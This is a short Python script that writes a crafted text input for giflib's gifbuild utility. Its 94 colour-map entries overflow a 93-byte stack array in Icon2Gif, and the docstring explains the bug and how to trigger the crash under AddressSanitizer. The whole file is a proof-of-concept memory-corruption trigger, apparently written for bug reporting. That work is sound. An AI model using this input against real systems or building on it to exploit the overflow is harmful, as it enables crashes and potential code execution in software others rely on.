#!/usr/bin/env python3
"""Generate a gifbuild text input that triggers a stack-buffer-overflow.

stack-buffer-overflow WRITE in Icon2Gif (util/gifbuild.c:242)

The GlobalColorKeys array is char[PRINTABLES] where PRINTABLES=93. Providing 94+
color map entries causes sscanf to write past the end of the array via
KeyTable[ColorMapSize] when ColorMapSize >= 93.

Usage:
    python3 gen_gifbuild_stack_overflow.py > poc_gifbuild.txt
    gifbuild < poc_gifbuild.txt > /dev/null    # triggers ASAN crash
"""

import sys

lines = [
    "screen width 100\n",
    "screen height 100\n",
    "screen colors 256\n",
    "screen background 0\n",
    "pixel aspect byte 0\n",
    "\n",
    "screen map\n",
]

# 94 entries overflows the char[93] GlobalColorKeys array
for i in range(94):
    lines.append(f"\trgb {i % 256} {i % 256} {i % 256} is A\n")

lines.extend(
    [
        "end\n",
        "\n",
        "image\n",
        "image top 0\n",
        "image left 0\n",
        "image bits 1 by 1\n",
        "A\n",
    ]
)

sys.stdout.writelines(lines)
